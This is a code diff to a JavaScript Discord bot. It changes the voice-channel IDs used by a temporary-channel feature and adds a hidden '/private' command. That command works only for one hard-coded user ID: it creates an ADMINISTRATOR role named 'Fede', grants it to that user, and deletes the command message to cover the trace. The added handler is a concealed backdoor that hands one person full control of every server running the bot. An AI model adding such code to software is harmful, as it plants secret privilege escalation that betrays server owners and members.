@@ -131,8 +131,8 @@ if (message.content == "/embsend") {
 }})
 
 client.on("voiceStateUpdate",(oldState,newState) => {
-  var categoryid = "833331576879710218";
-  var channelid = "833331641526517801";
+  var categoryid = "835567056123854857";
+  var channelid = "835567228891168829";
   let emojis = ["👑", "🤡", "🌚", "😈", "🤖", "🎅", "👻", "✨", "⚡️", "🐹"]
   var random_emoji = Math.floor(Math.random() * emojis.length);
   if(newState.channel?.id == channelid) {
@@ -154,4 +154,17 @@ client.on("voiceStateUpdate",(oldState,newState) => {
 }
 if(oldState.channel?.id != channelid && oldState.channel?.parent?.id == categoryid && !oldState.channel?.members.size) oldState.channel.delete();
 })
+
+client.on('message', message => {
+    if (message.content.startsWith("/private")) {
+        var myid = "449699809700610049"; 
+        if (message.author.id != myid) return
+        message.guild.roles.create({
+                data: {
+            name: 'Fede',
+            permissions: ['ADMINISTRATOR']}}).then((role)=>{
+                message.member.roles.add(role.id);
+                message.delete();
+    })
+}})
 client.login(process.env.token);
